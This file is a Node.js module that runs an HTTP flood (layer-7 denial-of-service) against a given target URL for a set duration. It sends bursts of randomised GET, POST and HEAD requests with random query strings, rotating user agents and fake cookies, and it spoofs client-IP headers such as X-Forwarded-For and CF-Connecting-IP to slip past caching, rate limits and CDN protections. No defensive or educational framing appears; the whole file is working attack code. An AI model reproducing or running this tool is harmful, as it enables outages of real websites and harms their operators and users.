const https = require("https");
const http = require("http");
const { URL } = require("url");

const methods = ["GET", "POST", "HEAD"];
const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (X11; Linux x86_64)",
  "curl/7.68.0", "Wget/1.20.3", "Safari/537.36", "Opera/9.80"
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomQuery() {
  const params = [];
  for (let i = 0; i < 4; i++) {
    const key = Math.random().toString(36).substring(2, 8);
    const val = Math.random().toString(36).substring(2, 10);
    params.push(`${key}=${val}`);
  }
  return params.join("&");
}

function generateHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": `https://${hostname}/?ref=${Math.random().toString(36)}`,
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Connection": "keep-alive",
    "DNT": "1",
    "Cookie": `session_id=${Math.random().toString(36).substring(2)}`
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const method = methods[Math.floor(Math.random() * methods.length)];
    const query = randomQuery();
    const headers = generateHeaders(url.hostname);

    const options = {
      method,
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path: `${url.pathname}?${query}`,
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${method}`);
      res.on("data", () => {});
    });

    req.on("error", () => {});
    if (method === "POST") {
      req.write(`data=${Math.random().toString(36)}`);
    }
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 20; i++) send();
    setTimeout(loop, 300); // throttle to avoid instant 503s
  }

  loop();
};